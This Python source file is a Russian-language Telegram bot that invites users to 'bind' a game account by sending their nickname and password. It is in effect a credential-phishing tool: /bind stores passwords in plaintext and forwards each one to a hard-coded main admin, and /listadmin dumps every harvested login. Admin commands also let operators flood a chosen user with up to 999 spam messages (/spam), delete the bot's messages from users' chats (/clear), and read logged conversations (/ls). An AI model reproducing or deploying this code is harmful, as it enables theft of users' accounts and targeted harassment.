import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import re
import threading
import time
import psutil

from aiogram import BaseMiddleware, Bot, Dispatcher, types
from aiogram.exceptions import TelegramRetryAfter
from aiogram.filters import Command
from pymongo import MongoClient

# ==========================================
# ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
# ==========================================
class HealthCheckHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b"Bot is active")

  def log_message(self, format, *args):
    return


def run_health_check_server():
  port = int(os.environ.get("PORT", 8080))
  server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
  server.serve_forever()


threading.Thread(target=run_health_check_server, daemon=True).start()

# ==========================================
# ОСНОВНЫЕ НАСТРОЙКИ И СОХРАНЕНИЕ В MONGODB
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MAIN_ADMIN_ID = 8070071877  # Главный админ
MONGO_URI = os.getenv("MONGO_URI")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Подключение к MongoDB Atlas
client = MongoClient(MONGO_URI)
db_collection = client.bot_database.bot_data


def load_data():
  data = db_collection.find_one({"_id": "bot_storage"})
  if data:
    data.pop("_id", None)
    return data

  default_db = {
      "admins": [MAIN_ADMIN_ID],
      "banned_users": {},
      "accounts_db": {},
  }
  db_collection.insert_one({"_id": "bot_storage", **default_db})
  return default_db


def save_data():
  try:
    save_obj = db.copy()
    save_obj["_id"] = "bot_storage"
    db_collection.replace_one({"_id": "bot_storage"}, save_obj, upsert=True)
  except Exception as e:
    print(f"Ошибка сохранения в БД: {e}")


db = load_data()

if MAIN_ADMIN_ID not in db["admins"]:
  db["admins"].append(MAIN_ADMIN_ID)
  save_data()

user_cooldowns = {}
bot_messages = {}  # {user_id: [message_ids]}
chat_history = {}  # {user_id: ["User: msg", "Bot: msg"]}
active_spam_tasks = {}  # {target_id: bool}


# ==========================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И MIDDLEWARE
# ==========================================
def log_chat(user_id: int, sender: str, text: str):
  if user_id not in chat_history:
    chat_history[user_id] = []
  chat_history[user_id].append(f"[{sender}]: {text}")
  if len(chat_history[user_id]) > 100:
    chat_history[user_id].pop(0)


async def send_tracked_message(chat_id: int, text: str):
  try:
    msg = await bot.send_message(chat_id, text)
    if chat_id not in bot_messages:
      bot_messages[chat_id] = []
    bot_messages[chat_id].append(msg.message_id)

    log_chat(chat_id, "Бот", text)
    return msg
  except Exception:
    return None


def is_valid_input(text: str) -> bool:
  return bool(re.match(r"^[A-Za-z0-9_]+$", text))


def is_admin(user_id: int) -> bool:
  return user_id in db["admins"] or user_id == MAIN_ADMIN_ID


class BanMiddleware(BaseMiddleware):

  async def __call__(self, handler, event, data_dict):
    user_id = event.from_user.id
    str_uid = str(user_id)
    current_time = time.time()

    if event.text:
      log_chat(user_id, "Пользователь", event.text)

    if str_uid in db["banned_users"]:
      unban_time = db["banned_users"][str_uid]
      if current_time < unban_time:
        seconds_left = int(unban_time - current_time)
        days_left = seconds_left // 86400
        minutes_left = (seconds_left % 86400) // 60

        await event.answer(
            f"[Система] У вас бан {days_left} дней и {minutes_left} минут."
        )
        return
      else:
        del db["banned_users"][str_uid]
        save_data()

    return await handler(event, data_dict)


dp.message.middleware(BanMiddleware())


# ==========================================
# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ
# ==========================================
@dp.message(Command("start"))
async def start_handler(message: types.Message):
  welcome_text = (
      "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие"
      " действия:\n1. Напишите: /bind [Ваш-Ник] [Ваш-Пароль]\n2. Напишите /help,"
      " чтобы увидеть возможности.\n3. Жалобы: /report [текст]"
  )
  await send_tracked_message(message.chat.id, welcome_text)


@dp.message(Command("help"))
async def help_handler(message: types.Message):
  help_text = (
      "Список доступных команд:\n\n"
      "/bind [Ник] [Пароль] - Привязать игровой аккаунт.\n"
      "/list - Показать привязанные аккаунты.\n"
      "/report [текст] - Отправить жалобу.\n"
      "/help - Показать это меню."
  )
  await send_tracked_message(message.chat.id, help_text)


@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
  user_id = message.from_user.id
  current_time = time.time()

  if user_id in user_cooldowns:
    elapsed = current_time - user_cooldowns[user_id]
    if elapsed < 15:
      remaining = int(15 - elapsed)
      for sec in range(remaining, 0, -1):
        try:
          timer_msg = await bot.send_message(
              user_id, f"[Система] До следующей попытки {sec} секунд."
          )
          await asyncio.sleep(1)
          await timer_msg.delete()
        except Exception:
          pass
      return

  args = message.text.split()
  if len(args) != 3:
    await send_tracked_message(
        user_id, "[Бот] Неверный формат. Используйте: /bind [Ник] [Пароль]"
    )
    return

  username = args[1]
  password = args[2]

  if not is_valid_input(username) or not is_valid_input(password):
    await send_tracked_message(user_id, "[Бот] Неверный пароль или ник.")
    return

  for uid, accs in db["accounts_db"].items():
    for acc in accs:
      if acc["nick"].lower() == username.lower():
        await send_tracked_message(user_id, "[Бот] Этот аккаунт уже привязан.")
        return

  user_cooldowns[user_id] = current_time
  str_uid = str(user_id)
  if str_uid not in db["accounts_db"]:
    db["accounts_db"][str_uid] = []

  db["accounts_db"][str_uid].append({"nick": username, "password": password})
  save_data()
  await send_tracked_message(user_id, "[Бот] Аккаунт был успешно привязан.")

  tg_user = (
      f"@{message.from_user.username}"
      if message.from_user.username
      else message.from_user.first_name
  )
  admin_msg = (
      f"Новый привязанный аккаунт:\n\nИгрок: {tg_user}\nTelegram ID:"
      f" {user_id}\nНик: {username}\nПароль: {password}"
  )

  try:
    await bot.send_message(chat_id=MAIN_ADMIN_ID, text=admin_msg)
  except Exception:
    pass


@dp.message(Command("list"))
async def list_handler(message: types.Message):
  user_id = message.from_user.id
  str_uid = str(user_id)
  if str_uid not in db["accounts_db"] or not db["accounts_db"][str_uid]:
    await send_tracked_message(user_id, "[Бот] У вас нет привязанных аккаунтов.")
    return

  text = "[Бот] Ваши привязанные аккаунты:\n\n"
  for acc in db["accounts_db"][str_uid]:
    text += f"Ник: {acc['nick']} | Пароль: {acc['password']}\n"
  await send_tracked_message(user_id, text)


@dp.message(Command("report"))
async def report_handler(message: types.Message):
  text = message.text[7:].strip()
  if not text:
    await send_tracked_message(
        message.chat.id, "[Система] Пример: /report Нашел баг"
    )
    return

  user_id = message.from_user.id
  tg_user = (
      f"@{message.from_user.username}"
      if message.from_user.username
      else message.from_user.first_name
  )
  report_msg = (
      f"[ЖАЛОБА/РЕПОРТ]\nОт пользователя: {tg_user}\nID: {user_id}\nТекст:"
      f" {text}"
  )

  try:
    await bot.send_message(MAIN_ADMIN_ID, report_msg)
    await send_tracked_message(
        message.chat.id, "[Система] Ваша жалоба отправлена."
    )
  except Exception:
    await send_tracked_message(
        message.chat.id, "[Система] Ошибка при отправке."
    )


# ==========================================
# АДМИН-КОМАНДЫ
# ==========================================
@dp.message(Command("antispam"))
async def antispam_handler(message: types.Message):
  user_id = message.from_user.id

  if not is_admin(user_id):
    return

  if user_id in active_spam_tasks and active_spam_tasks[user_id]:
    active_spam_tasks[user_id] = False
    await send_tracked_message(
        user_id, "[Антиспам] Спам-атака в ваш адрес успешно остановлена!"
    )
  else:
    await send_tracked_message(
        user_id, "[Антиспам] В ваш адрес сейчас спам не идет."
    )


@dp.message(Command("helpadmin"))
async def helpadmin_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return

  text = (
      "[ПАНЕЛЬ АДМИНИСТРАТОРА]\n\n"
      "📌 Пользовательские:\n"
      "/bind [Ник] [Пароль]\n"
      "/list\n"
      "/report [текст]\n\n"
      "🛡 Админские:\n"
      "/op [ID] - Выдать админку\n"
      "/deop [ID] - Снять админку\n"
      "/servers - Статус сервера\n"
      "/ban [ID] [дней] - Забанить\n"
      "/unban [ID] - Разбанить\n"
      "/spam [ID] (.текст.) [кол-во] - Запустить спам\n"
      "/antispam - Остановить спам в свою личку\n"
      "/msg [ID] [текст] - Ответить игроку\n"
      "/listadmin - Список всех аккаунтов (по частям)\n"
      "/dellist [Ник] - Удалить аккаунт по нику\n"
      "/ls [ID] - Посмотреть переписку бота с пользователем\n"
      "/clear [ID] - Удалить сообщения бота у юзера"
  )
  await bot.send_message(message.chat.id, text)


@dp.message(Command("ls"))
async def ls_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    await bot.send_message(
        message.chat.id, "[Система] Используйте: /ls [ID_пользователя]"
    )
    return

  target_id = int(args[1])
  if target_id not in chat_history or not chat_history[target_id]:
    await bot.send_message(
        message.chat.id, f"[Система] История сообщений с {target_id} пуста."
    )
    return

  history_text = f"[История диалога с {target_id}]:\n\n" + "\n".join(
      chat_history[target_id]
  )

  if len(history_text) > 3500:
    for i in range(0, len(history_text), 3500):
      await bot.send_message(message.chat.id, history_text[i : i + 3500])
  else:
    await bot.send_message(message.chat.id, history_text)


@dp.message(Command("listadmin"))
async def listadmin_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  if not db["accounts_db"]:
    await bot.send_message(
        message.chat.id, "[Система] База данных аккаунтов пуста."
    )
    return

  text = "[Система] Все привязанные аккаунты:\n\n"
  for uid, accs in db["accounts_db"].items():
    for acc in accs:
      text += f"ID: {uid} | Ник: {acc['nick']} | Пароль: {acc['password']}\n"

  if len(text) > 3500:
    chunks = [text[i : i + 3500] for i in range(0, len(text), 3500)]
    for chunk in chunks:
      await bot.send_message(message.chat.id, chunk)
      await asyncio.sleep(0.3)
  else:
    await bot.send_message(message.chat.id, text)


@dp.message(Command("spam"))
async def spam_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return

  pattern = r"/spam\s+(\d+)\s+\(\.(.*?)\.\)\s+(\d+)"
  match = re.search(pattern, message.text, re.DOTALL)

  if not match:
    await bot.send_message(
        message.chat.id,
        "[Система] Формат: /spam [ID] (.Текст.) [Кол-во]",
    )
    return

  target_id = int(match.group(1))
  spam_text = match.group(2)
  count = min(int(match.group(3)), 999)

  if target_id == MAIN_ADMIN_ID:
    await bot.send_message(
        message.chat.id,
        "[Система] Категорически запрещено отправлять спам Главному"
        " Администратору!",
    )
    return

  active_spam_tasks[target_id] = True

  report_msg = await bot.send_message(
      message.chat.id,
      f"[Спам Запуск]\nОтправка пользователю {target_id}\nПрогресс: 0/{count}",
  )

  sent_count = 0
  for i in range(1, count + 1):
    if not active_spam_tasks.get(target_id, True):
      await bot.send_message(
          message.chat.id,
          f"[Спам Прерван] Пользователь {target_id} остановил спам через"
          " /antispam.",
      )
      break

    try:
      await send_tracked_message(target_id, spam_text)
      sent_count += 1
      await asyncio.sleep(0.1)

      if i % 25 == 0 or i == count:
        try:
          await bot.edit_message_text(
              chat_id=message.chat.id,
              message_id=report_msg.message_id,
              text=(
                  f"[Спам Отчет]\nПользователь: {target_id}\nОтправлено:"
                  f" {sent_count}/{count}"
              ),
          )
        except Exception:
          pass
    except TelegramRetryAfter as e:
      await asyncio.sleep(e.retry_after)
    except Exception as e:
      await bot.send_message(
          message.chat.id,
          f"[Спам Ошибка] Остановлено на {sent_count}/{count}. Ошибка: {e}",
      )
      break

  active_spam_tasks[target_id] = False


@dp.message(Command("ban"))
async def ban_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 3:
    await bot.send_message(
        message.chat.id, "[Система] Пример: /ban 123456789 7"
    )
    return

  target_id = int(args[1])
  days = int(args[2])

  if target_id == MAIN_ADMIN_ID:
    await bot.send_message(
        message.chat.id, "[Система] Нельзя забанить Главного Админа."
    )
    return

  unban_time = time.time() + (days * 86400)
  db["banned_users"][str(target_id)] = unban_time
  save_data()

  try:
    await bot.send_message(
        target_id,
        f"[Система] Вы заблокированы администратором на {days} дней.",
    )
  except Exception:
    pass

  await bot.send_message(
      message.chat.id,
      f"[Система] Пользователь {target_id} заблокирован на {days} дней.",
  )


@dp.message(Command("op"))
async def op_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    return
  target_id = int(args[1])
  if target_id not in db["admins"]:
    db["admins"].append(target_id)
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] Пользователю {target_id} выдана админка."
    )


@dp.message(Command("deop"))
async def deop_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    return
  target_id = int(args[1])
  if target_id == MAIN_ADMIN_ID:
    return await bot.send_message(
        message.chat.id, "[Система] Нельзя забрать админку у Главного."
    )
  if target_id in db["admins"]:
    db["admins"].remove(target_id)
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] С пользователя {target_id} снята админка."
    )


@dp.message(Command("servers", "server"))
async def servers_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  process = psutil.Process(os.getpid())
  cpu_usage = process.cpu_percent(interval=0.5)
  ram_used_mb = round(process.memory_info().rss / (1024 * 1024), 1)
  stats_text = (
      "[Статус Бот-Процесса]\n\n"
      f"Загрузка ЦП (CPU): {cpu_usage}%\n"
      f"Использование ОЗУ (RAM): {ram_used_mb} MB\n"
      "Статус веб-сервера: Активен (24/7)"
  )
  await bot.send_message(message.chat.id, stats_text)


@dp.message(Command("unban"))
async def unban_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    return
  target_id = str(args[1])
  if target_id in db["banned_users"]:
    del db["banned_users"][target_id]
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] Пользователь {target_id} разблокирован."
    )


@dp.message(Command("msg"))
async def msg_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split(maxsplit=2)
  if len(args) < 3:
    return
  target_id = int(args[1])
  text = args[2]
  try:
    await send_tracked_message(target_id, f"[Ответ от администрации]\n{text}")
    await bot.send_message(message.chat.id, "[Система] Сообщение отправлено.")
  except Exception:
    await bot.send_message(message.chat.id, "[Система] Ошибка отправки.")


@dp.message(Command("dellist"))
async def dellist_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    return
  target_nick = args[1]
  found = False
  for uid, accs in db["accounts_db"].items():
    for acc in accs[:]:
      if acc["nick"].lower() == target_nick.lower():
        accs.remove(acc)
        found = True

  if found:
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] Аккаунт {target_nick} удален из базы."
    )
  else:
    await bot.send_message(message.chat.id, "[Система] Ник не найден.")


@dp.message(Command("clear"))
async def clear_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    return
  target_id = int(args[1])
  if target_id in bot_messages and bot_messages[target_id]:
    deleted_count = 0
    for msg_id in bot_messages[target_id]:
      try:
        await bot.delete_message(chat_id=target_id, message_id=msg_id)
        deleted_count += 1
      except Exception:
        pass
    bot_messages[target_id].clear()
    await bot.send_message(
        message.chat.id,
        f"[Система] Удалено {deleted_count} сообщений у {target_id}.",
    )


# ==========================================
# ЗАПУСК БОТА
# ==========================================
async def main():
  await bot.delete_webhook(drop_pending_updates=True)
  await dp.start_polling(bot)


if __name__ == "__main__":
  asyncio.run(main())
  
